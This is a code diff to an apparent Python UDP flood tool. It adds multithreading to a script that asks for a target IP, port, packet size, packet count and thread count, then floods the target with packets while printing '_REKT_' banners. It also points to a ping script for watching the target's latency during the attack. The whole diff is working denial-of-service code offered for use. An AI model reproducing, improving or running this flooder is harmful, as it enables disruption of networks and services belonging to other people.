@@ -42,6 +42,19 @@ def color_green(text):
 
 def create_message(size):
     return b'X' * size 
+    
+def send_UDP(sock, MESSAGE, UDP_IP, UDP_PORT):
+    sock.sendto(MESSAGE, (UDP_IP, UDP_PORT))
+
+def start_threads(MESSAGE, UDP_IP, UDP_PORT):
+    threads = []
+    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+    for T in range(thread_count):
+        thread = threading.Thread(target=send_UDP, args=(sock, MESSAGE, UDP_IP, UDP_PORT))
+        threads.append(thread)
+        thread.start()
+    for thread in threads:
+        thread.join()
 
 print(color_red(""" 
 
@@ -57,10 +70,11 @@ print(color_red("""
 UDP_IP = input(color_red("Enter the target IP address (e.g., 127.0.0.1): "))
 UDP_PORT = int(input(color_red("Enter the target port (e.g., 5005): ")))
 packet_size = int(input(color_red("Enter the packet size in bytes (1 - 9216): ")))
+amount = int(input(color_red("Enter the number of packets to send: ")))
 print(color_yellow("FLOOD will be initialized after next input.")) 
 print(color_yellow("Run ./FLOOD/ping.sh in a seperate terminal after initializing "))
 print(color_yellow("to monitor ping of " + color_green(UDP_IP)))
-amount = int(input(color_red("Enter the number of packets to send: ")))
+thread_count = int(input(color_red("Enter the number of threads: ")))
 
 MESSAGE = create_message(packet_size)
 
@@ -73,7 +87,7 @@ print(color_green("~FLOOD INITIATED~"))
 sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
 
 for i in range(amount):
-    sock.sendto(MESSAGE, (UDP_IP, UDP_PORT))
+    start_threads(MESSAGE, UDP_IP, UDP_PORT)
     print(color_yellow(f"{i + 1}") + color_red("_REKT_") + color_yellow(f"{i + 1}") + color_red("_REKT_") + color_yellow(f"{i + 1}") + color_red("_REKT_") + color_yellow(f"{i + 1}"))
 
 print(color_green("~DONE~")) 
